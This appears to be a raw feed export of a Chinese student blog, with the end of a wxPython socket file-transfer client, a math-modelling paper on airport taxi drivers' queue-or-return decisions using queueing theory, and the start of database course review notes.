class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># 发命令</span>            <span class="token comment"># get a.txt</span>            <span class="token keyword">if</span> cmd<span class="token operator">==</span><span class="token string">'a'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            phone<span class="token punctuation">.</span>send<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 已写的方式打开一个新文件，接收服务器发来的文件的内容写入客户端的新文件</span>            <span class="token comment"># 第一步：先收取报头的长度</span>            obj <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>            header_size <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token comment"># 第二步：再收报头</span>            header_bytes <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>header_size<span class="token punctuation">)</span>            <span class="token comment"># 第三步：从报头中间解析出对真是数据的描述信息</span>            header_json <span class="token operator">=</span> header_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>            header_dic <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>header_json<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>            total_size <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'file_size'</span><span class="token punctuation">]</span>            filename <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span>            <span class="token comment"># 第三步：接受真实的数据</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 在自己的电脑中找一个地址打开一个同类型的文件准备接收数据</span>                recv_size <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">while</span> recv_size <span class="token operator">&lt;</span> total_size<span class="token punctuation">:</span>                    line <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    recv_size <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'总大小：%s   已下载大小：%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>total_size<span class="token punctuation">,</span> recv_size<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 显示下载进度</span>            cmd<span class="token operator">=</span><span class="token string">'a'</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件下载完成!"</span><span class="token punctuation">,</span> <span class="token string">"信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h3><p>这个简单文件传输器是真的简单，基本上还是点对点的下载，只是我想尝试模拟FTP协议，但是发现如果用py开启这个协议，实验完全就是协议的工作了，这个文件传输器就变成了协议开启器。</p><p>在权衡之后，我采用了在服务器端读取设置的共享文件夹的文件名，并将其写成一个文件，客户端通过下载该文件可以实现对其他文件的可知。</p><p>当我在第二天一开始，把这个代码写完时，我以为我接下来的任务会很轻松然后………..</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训记录 </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模：综合选拔题</title>
      <link href="/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/"/>
      <url>/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/</url>
      
        <content type="html"><![CDATA[<h2 id="数学建模：综合选拔题"><a href="#数学建模：综合选拔题" class="headerlink" title="数学建模：综合选拔题"></a>数学建模：综合选拔题</h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>随着我国航空工业技术的发展和人民生活水平的不断提高，我国民用航空业发展迅速，在可预见的未来伴随着国产大飞机的逐步投产交付，全国各地将兴建起一批新机场，同时机场的旅客吞吐量不断攀升，旅客离港时出租车是机场重要的散客渠道之一。</p><p>由于不同时空，机场规模不同，航班载客数量等做多方面存在差距，如何解决离港出租车排队等待离港的判断问题的研究具有深远意义。本文针对日照市机场，从出租车司机收益最大的角度出发，给出该机场出租车司机的选择方案模型，并分析模型的合理性和对相关因素的依赖性。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>关键字： 排队论 费用决策 数据处理 客流集散特性</p><p>[TOC]</p><h3 id="一、问题重述："><a href="#一、问题重述：" class="headerlink" title="一、问题重述："></a>一、问题重述：</h3><p>根据统计，多数乘客到达机场后，都会将市区作为目的地。而出租车因其方便快捷而备受出港旅客青睐。在今年数据中在同时拥有城市内轨道交通，出租车，机场大巴等出行方式的特大机场如首都机场，通过出租车进行的人员集散仍然十分可观。在出行选择较为单一的中小型机场中，出租车仍作为主要旅客集散方式。</p><p>同时，对于出租车司机，出港旅客也是一个巨大的客户来源。但是，一般来讲，国内机场离城市中心比较远，想要在机场承接客流量，出租车司机往往会面临在机场等待还是回城市中心的选择:</p><p>在机场载客返回。由于国内机场多数采用进站客流与出站客流分离的规划思想使得出租车司机想要在到达机场后载客，需要按照“先来后到”的顺序进入指定“蓄车池”等待，等待时间则取决于到港乘客多少、蓄车池数量以及排队出租车的数量，这就需要司机付出一定的时间成本。</p><p>空载返回市区接客。出租车司机付出空载费用（多余的油耗、时间等）以及潜在客户收益，选择承接城区稳定的客流量来源。</p><p>在整个问题中最为影响司机决策判断的应为时间成本，即损失时间内可获得的经济效益</p><h3 id="二、模型假设与符号说明："><a href="#二、模型假设与符号说明：" class="headerlink" title="二、模型假设与符号说明："></a>二、模型假设与符号说明：</h3><h4 id="2-1模型假设"><a href="#2-1模型假设" class="headerlink" title="2.1模型假设"></a>2.1模型假设</h4><p>根据题意进行如下假设</p><p>（1）假设乘客在机场乘车需经历排队过程而非完全随机。</p><p>（2）不同时间段到达航班数量不同，视为不同变量。</p><p>（3）忽略国内航班与国际航班及不同客机型号载客量的差异。</p><p>（4）忽略时令导致的航班时刻变化，将全年某一航班到达时间视为相同。</p><p>（5）忽略航班取消，晚点等不可抗力影响。</p><p>（6）假设出租车司机只接待从市中心到机场与从离开机场的乘客。</p><p>（7）决策的选择仅考虑经济因素，忽略个人倾向等其他因素。</p><h4 id="2-2符号说明"><a href="#2-2符号说明" class="headerlink" title="2.2符号说明"></a>2.2符号说明</h4><table><thead><tr><th>符号</th><th>含义</th><th>单位</th></tr></thead><tbody><tr><td>Q</td><td>模型决策变量，根据所得Q值进行决策</td><td></td></tr><tr><td>N（t）</td><td>排队车辆数目</td><td>辆</td></tr><tr><td>L</td><td>机场到市中心距离</td><td>千米</td></tr><tr><td>R</td><td>市区半径</td><td>千米</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps1.jpg"></td><td>司机等待载客预期收益</td><td>元</td></tr><tr><td>T</td><td>等待载客的排队时间</td><td>小时</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps2.jpg"></td><td>出租车司机的平均时薪</td><td>元</td></tr><tr><td>k</td><td>航班的平均载客数</td><td>人</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps3.jpg"></td><td>车辆接受服务的平均时间</td><td>秒</td></tr><tr><td>λ</td><td>单位时刻出租车到达的数量</td><td>辆</td></tr><tr><td>c</td><td>车站的上车点数</td><td>个</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps4.jpg"></td><td>平均服务率</td><td></td></tr></tbody></table><h3 id="三、问题分析："><a href="#三、问题分析：" class="headerlink" title="三、问题分析："></a>三、问题分析：</h3><p>为充分分析决策的影响因素及其机理，我们可以将影响出租车司机决策的因素简单估计成，在机场选择留下等待送客和选择在市区拉客各自参生的的预期利润。   </p><p>综上所述我们可以将司机所作出的决策，所产生结果下分为两个部分</p><table><thead><tr><th></th><th>司机是否进行排队等待</th><th>空载或载客</th></tr></thead><tbody><tr><td>1</td><td>是</td><td>全程载客</td></tr><tr><td>2</td><td>否</td><td>空载返回</td></tr></tbody></table><p>一、排队等候，通过排队车辆数，航班到站时间等情况估算等候的时间成本，并结合载客回市区的收益得出采取此决策的预期利润。</p><p>二、空载返回,将空跑损耗作为成本，估计返回节省下的等候时间在市区拉客产生的收益，同样地可以给出采取空载返回能够顺利载客情况下，决策的预期利润。</p><p>三、假设在空载返回后，能够立刻拉客，在市区等待载客的时间能够忽略不计。</p><p>在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。机场的出租车载客收益与载客的行驶里程有关，乘客的目的地有远有近，但总体保持在市区范围内。</p><h3 id="四、样例分析："><a href="#四、样例分析：" class="headerlink" title="四、样例分析："></a>四、样例分析：</h3><p>以日照机场为例，由于学校所在地为日照，通过日照本地宝等平台对日照机场部分信息进行了收集处理。日照机场主要运营国内航向到站时间集中于上午九时至晚九时，出站时间为上午十时至晚二十二时。</p><p>统计结果如下图所示：</p><center><img src=".\数学建模国赛选拔\wps5.jpg" style="zoom:80%;" /> </center><center>图3-1 日照国际航空港到站航班频率分布图</center><center><img src=".\数学建模国赛选拔\wps6.jpg" style="zoom:80%;" /> </center>图4-2 日照市国际航空港离港航班时刻统计图<p>显而易见的是，一天之内乘客到站时间并不是均匀分布，而是集中于几个时间段内，所以在不同时间情况下，司机做出决策应不同。</p><p>同时我们可以查询到，日照市机场大巴发车时刻表，根据相应数据做出折线图如下:</p><center><img src=".\数学建模国赛选拔\wps7.jpg" style="zoom:80%;" /> </center><center>图4-3 日照市机场大巴发车时刻表</center>日照市机场大巴发车时间安排集中于下午十三时至十五时与晚十七时至20时，结合航班到站时间发现，机场大巴到达时间相较于航班抵达时间高峰有一定迟滞性。结合实际情况，由于乘客下机后需办理行李提取、海关检疫等一系列手续，故乘客离开的高峰需顺延1至2小时。故出租车运营时间将有一定滞后性。<p>为了方便决策方案的给出，根据出港人流量和机场大巴时间安排的高峰、低谷，并结合实际情况将一天分为0至9时;9至13时;14时至15时;15至17时，17至20时；21时至0时数个时间段，具体划分方案如下:</p><p>0至9时与20时至0时，机场无航班进出不做考虑。9至13时与15至17时存在航班，机场大巴尚未开行，出租车运送乘客占比较高，14时至15时与17至20时机场大巴开行时间段，出租车运送乘客占比较低。</p><p>在司机接送旅客收入方面：日照市出租车执行的收费标准为：SP0+M(s)（S-2），即2公里内为起步价SP0， 超过两公里部分按里程的不同进行阶梯计价。</p><center><img src=".\数学建模国赛选拔\wps8.jpg" style="zoom:80%;" /> </center><center>图4-4 日照市机场与市区分布图</center>同时国内机场普遍离城市中心比较远，以日照市为例，日照市机场位于市区西南方向，距市区25至30公里。<h3 id="五、决策模型建立："><a href="#五、决策模型建立：" class="headerlink" title="五、决策模型建立："></a>五、决策模型建立：</h3><p>本题为决策问题,我们可以建立模型对司机进行决策的过程进行描述。</p><h4 id="5-1目标函数的建立"><a href="#5-1目标函数的建立" class="headerlink" title="5.1目标函数的建立"></a>5.1目标函数的建立</h4><p>设Z为司机通过决策也已获得的利润，可将某种决策下的利润P（profit）表示为:</p><center><img src=".\数学建模国赛选拔\wps9.jpg" style="zoom:100%;" /> </center>Q为决变量，决定了采取的决策，结合现实状况，出租车司机不可能同时空车返回市区和等待，Q的取值即为[0,1],若Q取1，代表等选择等待载客，Q=0则代表空载返回。P1、P2分别代表了(A)、(B)两方案的利润。如此规定后,便可以通过目标函数对利润Z求取最大值即可。<center><img src=".\数学建模国赛选拔\wps10.jpg" style="zoom:100%;" /></center>#### 5.2所有可能情况的阐释<p>由此可以得出影响司机决策的因素有:载客的利润期望、空载返回的时间以及消耗、市区载客的预期利润。对这些因素继续进行具体分析，可以发现司机的决策实际上由多个要素共同决定:排队车辆数N（t）、返回路程S，收费标准M(S)、当前时间段内抵达机场的航班数量N、等待载客的时间成本（TS）。其中，排队车辆数M和机场返回市区乘客数量N，决定了等待时间T，返回路程和收费标准共同影响了载客利润P1。另外返回路程还制约了空载损耗的大小，收费标准还决定了司机在市区的收益。</p><h5 id="5-2-1基于排队载客的模型建立："><a href="#5-2-1基于排队载客的模型建立：" class="headerlink" title="5.2.1基于排队载客的模型建立："></a>5.2.1基于排队载客的模型建立：</h5><p>基于排队载客P1，其收益为收入减去成本，此处的成本包括时间成本及载客过程中油耗和过路费等。在一般情况下过路费包含在乘客付款中可以忽略不计。</p><center><img src=".\数学建模国赛选拔\wps11.jpg" style="zoom:100%;" /> </center>由于阶梯计价的计价策略，载客收入W1为分段函数，在起步距离S0以内部分收费SP0，以外部分采取阶梯计价可表示为：<center><img src=".\数学建模国赛选拔\wps12.jpg" style="zoom:100%;" /> </center>在此表达式中等待载客的时间成本TS1，可以看做等待时间与单位时间下的平均收益的比值。<p>设司机的单位时间平均收入为ρ，T为等候载客的时间。</p><center><img src=".\数学建模国赛选拔\wps13.jpg" style="zoom:100%;" /> </center>再此基础上，出租车在机场排队可能等待时间T，取决于不同时段航班的到达规律、出租车的排队数量。由于不同时间阶段下，等待载客的时间T存在较大波动<p>在前文的样例分析中，可知不同时间段乘坐公交车的乘客数，占航班总旅客数的占比是不同的,不妨设在在无机场大巴时总客流量与乘坐出租车旅客数比例为C1，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2</p><center><img src=".\数学建模国赛选拔\wps14.jpg" style="zoom:100%;" /> </center><img src=".\数学建模国赛选拔\wps15.jpg" style="zoom:100%;" />表示机场一时间阶段内抵达的乘客，由假设中设忽略国内航班与国际航班及不同客机型号载客量的差异，设k为航班的平均载客数，有如下判断：<center><img src=".\数学建模国赛选拔\wps16.jpg" style="zoom:100%;" /> </center>**等待时间T的确定：**<p>旅客乘坐飞机到达空港客运交通枢纽的集聚规律服从泊松分布[1],设出租车到达率同样服从Poisson分布，由排队论可知，当输入过程为泊松流时，车辆到达的时间间隔服从负指数分布</p><p>平均服务率，设置机场存在c个上车点，每辆车接受服务的平均时间记为µ0，接受服务的时间服从正态分布。其中每辆车接受服务的平均时间记为µ0,可视为常量。</p><p>当乘车人数时可以认为乘车人数足够多，只需要考虑每辆车的接受服务时间</p><center><img src=".\数学建模国赛选拔\wps22.jpg" style="zoom:100%;" /> </center>N0表示每小时内有多少辆车接受服务<p>当乘车人数时,在排队过程中，必然出行在队首车辆会进入等待，设此时的额外等待时间为，</p><center><img src=".\数学建模国赛选拔\wps25.jpg" style="zoom:100%;" /> </center>则平均服务率为<center><img src=".\数学建模国赛选拔\wps26.jpg" style="zoom:100%;" /></center>当成等待区乘客数量稳定时，由排队论可知，系统此时满足M/M/C/∞/∞/FCFS的状况。它表示：在a个服务台与先到先服务前提下，车站蓄车池容量无限与到站客源无限，出租车到达相互独立，且服从参数为λ的泊松分布；同时，出租车的服务时间服从参数为µ的负指数分布。其中，λ表示单位时刻出租车到达的数量，Ε(t)表示系统的平均服务率，即单位时间内离开排队池的出租车数量。<p>则服务强度为：</p><center><img src=".\数学建模国赛选拔\wps29.jpg" style="zoom:100%;" /> </center>系统平均等待车辆数LQ<center><img src=".\数学建模国赛选拔\wps30.jpg" style="zoom:100%;" /> </center>由上式：令n`=n-c对应公式经化简可得：<center><img src=".\数学建模国赛选拔\wps31.jpg" style="zoom:100%;" /> </center>蓄车池空闲概率P0:<center><img src=".\数学建模国赛选拔\wps32.jpg" style="zoom:100%;" /> </center>由Little公式，得司机平均等待时间为:<center><img src=".\数学建模国赛选拔\wps33.jpg" style="zoom:100%;" /> </center>则每辆出租车的逗留时间为：<center><img src=".\数学建模国赛选拔\wps34.jpg" style="zoom:100%;" /> </center>##### 5.2.2基于返回拉客的模型建立:<p>基于返回拉客P2，其收益为收入减去成本，此处的成本包含，由机场返回市中心的折算时间成本，空载返回产生油耗等。</p><p>假设司机选择空载返回市区接客，假设市区乘客数量足够，即不需要在市区等待乘客，此时预期能获得的收益W2为选择在飞机场排队载客时的时间成本。</p><center><img src=".\数学建模国赛选拔\wps35.jpg" style="zoom:100%;" /> <center>由于在不同城市，城市规划及市区发展的现实不同，不妨设从机场到达市中心的距离为L，城区半径为r,则任一乘客搭乘出租车返回市区的距离S服从N(L,r2),所以可设<p>为空载返回时的损失。故出租车从机场载客返回市区总收益为：节约排队载客的时间成本与空载返回产生油耗过路费等损耗与返程中的时间成本之差。</p><p>综上所述：</p><center><img src=".\数学建模国赛选拔\wps37.jpg" style="zoom:100%;" /> </center>折算的时间成本TS2可以表示为： <p>其中V为出租车行驶的平均速度，ρ为司机的单位时间平均收入 </p><center><img src=".\数学建模国赛选拔\wps40.jpg" style="zoom:100%;" /> <center><h4 id="5-3决策模型："><a href="#5-3决策模型：" class="headerlink" title="5.3决策模型："></a>5.3决策模型：</h4><p>从模型中得到的Q即为推荐司机选择排队的概率，其取值范围为[0, 1]。Q越大，更推荐司机选择在排队区等待，反之则是空载，具体如下： </p><p>(1)，司机最好选择在排队区等待，此时排队预期平均收益高于空载返回的预期收益。</p><p>(2) P &lt; 0.5，司机最好选择空载返回，此时排队预期平均收益低于空载返回的预期收益。</p><h3 id="六、选择模型的检验与合理性分析"><a href="#六、选择模型的检验与合理性分析" class="headerlink" title="六、选择模型的检验与合理性分析"></a>六、选择模型的检验与合理性分析</h3><p>在前面的样例分析阶段的研究中，探讨了日照市机场的相关信息，接下来将以日照市为例对模型进行检验和合理性分析。</p><p>中心商务区（CBD）是指一个城市里主要商业活动进行的地区同时也是市中心，在日照市我们可以将万达及华润万象汇所在的区域定义为日照市的中心商务区。</p><center><img src=".\数学建模国赛选拔\wps43.jpg" style="zoom:100%;" /> </center><center>图6-1 出租车路线规划图</center><center><img src=".\数学建模国赛选拔\wps44.jpg" style="zoom:100%;" /> </center>通过百度地图可查，由日照山字河国际机场到市中心依路线不同，其距离为29±3公里，即如此可以确定路程L=29，市区范围R=3，返回市区的平均时间t约为41分钟。并结合收费标准得到载客回市区收益W1，带入数据得。<center>W1=57.62</center>考虑到空载和载人对汽车油耗影响较小，可以忽略不计，由于日照市出租车车型并不统一，此处采用可查数据中出现的大众捷达车型，油耗为5.7L/100km，目前国内油价为8.43元/L。可以计算：<center><img src=".\数学建模国赛选拔\wps45.jpg" style="zoom:100%;" /> </center>同时通过找工易平台获取信息为，山东省出租车司机的平均薪资为11479元/月，出租车司机工作时间为11个小时，每个月休息2天，如此可以推算日照市出租车司机在市中心每小时的利润为:<center><img src=".\数学建模国赛选拔\wps46.jpg" style="zoom:100%;" /> </center>可以计算出租车司机空载返回时的时间成本为： <p>同时日照市机场作为中小型机场，其到站客流波动较大，结合上文分析可粗略估计在无机场大巴时总客流量与乘坐出租车旅客数比例为C1=0.32，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2=0.22，结合航班到站时间有：</p><table><thead><tr><th></th><th>9至13时</th><th>13至15时</th><th>15至16时</th><th>16至17时</th><th>17至18时</th><th>18至20时</th><th>20至21时</th><th>21时至次日9时</th></tr></thead><tbody><tr><td>平均打车数</td><td>56</td><td>27.5</td><td>0</td><td>148</td><td>66</td><td>11</td><td>64</td><td>0</td></tr><tr><td>平均服务率</td><td>80</td><td>43.64</td><td></td><td>80</td><td>80</td><td>70.9</td><td>80</td><td></td></tr></tbody></table><p>表6-1 日照市国际机场不同时间段的平均打车数即平均服务率统计表</p><p>由山东省公共数据公开网可以查询到日照市交通运输局发布的日照市市直出租车信息汇总，日照市市区共有出租车969辆。由于部分关键数据缺失，这里采用其他城市数据进行估算，设λ=42，为90s，设日照市机场服务台数为2。</p><p>平均服务率可同时求出，以标记正在上表中</p><p>当在13-16时，18至20时，21时至次日9时三个时间段内，乘客数量小于到达的车辆数量，则平均服务率为以13-16时为例</p><p>E(t)=43.64带入公式</p><center><img src=".\数学建模国赛选拔\wps50.jpg" style="zoom:100%;" /> <center><center><img src=".\数学建模国赛选拔\wps51.jpg" style="zoom:100%;" /> </center><center><img src=".\数学建模国赛选拔\wps52.jpg" style="zoom:100%;" /> </center>此时Wq远大于，可以忽略不计<center><img src=".\数学建模国赛选拔\wps54.jpg" style="zoom:100%;" /> <center><p>此时，结果为负，=47.902，应选择空载返回市区。</p><p>同理当其余时间段，乘客数量大于到达的车辆数量，则平均服务率为<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml9260\wps57.jpg" alt="img">，易证此时P1&gt;P2应选择排队载客。</p><p>综上所述对于日照市机场有以下判断：</p><table><thead><tr><th align="center">时间</th><th align="center">13-16时，18至20时，21时至次日9时</th><th align="center">9至13时，16至18时，20至21时</th></tr></thead><tbody><tr><td align="center">司机选择</td><td align="center">返回拉客</td><td align="center">等待载客</td></tr></tbody></table><p>表6-2 针对日照市特点下不同时间段预测数据</p><p>在不同时间阶段下，模型能够做出不同判断，保证出租车司机的利益最大化，可以证明模型具有合理性。</p><h3 id="七、-模型改进方向"><a href="#七、-模型改进方向" class="headerlink" title="七、 模型改进方向"></a>七、 模型改进方向</h3><p>在本题中，选择机场为中小型机场在模拟过程中航班到达量不同时间段内，波动较大。同时在模型检验和合理性分析阶段，因为部分条件获取难度较大采取使用其他数据进行估计，并不能保证完全准确。在估计机场乘客数的推断中，在模型建立之初故意选择性的忽视了不同航班载客量的差异，将其视为相同参数，若将其进行妥善分析能进一步提高模型的准确率与可靠性。</p><p>参考文献</p><p>[1]何汉.大型空港客运交通枢纽客流集散规律研究.铁道运输与经济. 2019.04.17</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库复习资料整理</title>
      <link href="/2022/07/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
      <url>/2022/07/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库复习资料整理"><a href="#数据库复习资料整理" class="headerlink" title="数据库复习资料整理"></a>数据库复习资料整理</h1><p>[TOC]</p><h2 id="第1章-数据库概述"><a href="#第1章-数据库概述" class="headerlink" title="第1章  数据库概述"></a>第1章  数据库概述</h2><h3 id="1-1-数据与信息"><a href="#1-1-数据与信息" class="headerlink" title="1.1 数据与信息"></a>1.1 数据与信息</h3><p>**数据(Data)**是描述事物的符号记录，是信息的符号表示或载体，也是数据库中存储的基本对象，数据描述现实世界中各种具体事物或抽象概念的、可存储并具有明确意义的符号记录。</p><p>数据本身无意义，具有客观性，经过解释才能表示一定的意义。数据的含义是对数据的解释，称为数据的语义，数据与其语义是不可分的</p><p><strong>信息（Information）</strong>是数据的内涵，是数据的语义解释。</p><h3 id="1-2-数据管理技术的发展"><a href="#1-2-数据管理技术的发展" class="headerlink" title="1.2 数据管理技术的发展"></a>1.2 数据管理技术的发展</h3><h4 id="人工管理阶段"><a href="#人工管理阶段" class="headerlink" title="人工管理阶段"></a>人工管理阶段</h4><blockquote><p>时期:40年代中–50年代中<br>应用需求：科学计算          硬件水平：无直接存取存储设备     软件水平：没有操作系统      处理方式：批处理</p><p>人工管理阶段的特点：数据不保存，应用程序管理数据，数据不共享，数据不具有独立性</p></blockquote><h4 id="文件管理阶段"><a href="#文件管理阶段" class="headerlink" title="文件管理阶段"></a>文件管理阶段</h4><blockquote><p>时期:50年代末–60年代中<br>应用需求:科学计算、管理   硬件水平:磁盘、磁鼓   软件水平:有文件系统      处理方式:联机实时处理、批处理</p><p>文件管理阶段的特点：数据以文件的形式长期保存在外存储器中数据独立性差，由文件系统对数据进行管理，数据共享性差，冗余度大，数据独立性差。</p></blockquote><h4 id="数据库管理阶段"><a href="#数据库管理阶段" class="headerlink" title="数据库管理阶段"></a>数据库管理阶段</h4><blockquote><p>时期:60年代末以来<br>背景:大规模管理  硬件背景:大容量磁盘 软件背景:有数据库管理系统  处理方式:联机实时处理,分布处理,批处理</p><p>数据库管理系统阶段的特点： 数据结构化，数据的共享性高，冗余度低，易扩充，数据独立性高，数据由DBMS统一管理和控制</p></blockquote><h3 id="1-3-数据库系统的基本概念"><a href="#1-3-数据库系统的基本概念" class="headerlink" title="1.3 数据库系统的基本概念"></a>1.3 数据库系统的基本概念</h3><p>**数据库(Database，DB)**是长期储存在计算机内、有组织的、可共享的大量数据的集合</p><blockquote><p>数据库的基本特征<br>数据按一定的数据模型组织、描述和储存，冗余度较小，数据独立性较高，易扩展，可为各种用户共享</p></blockquote><p>**数据库管理系统(DataBase Management System, DBMS)**：是数据库系统的核心，位于用户与操作系统之间的一层数据管理软件</p><blockquote><p>DBMS的主要功能包括：<br>数据定义功能，数据操纵功能，数据组织、存储和管理，数据库运行管理，数据库的建立和维护功能</p></blockquote><p>**数据库系统(DataBase System， DBS)**是指在计算机系统中引入数据库后的系统。</p><h3 id="1-4-数据模型"><a href="#1-4-数据模型" class="headerlink" title="1.4 数据模型"></a>1.4 数据模型</h3><h4 id="三个世界的划分"><a href="#三个世界的划分" class="headerlink" title="三个世界的划分"></a>三个世界的划分</h4><pre class="line-numbers language-none"><code 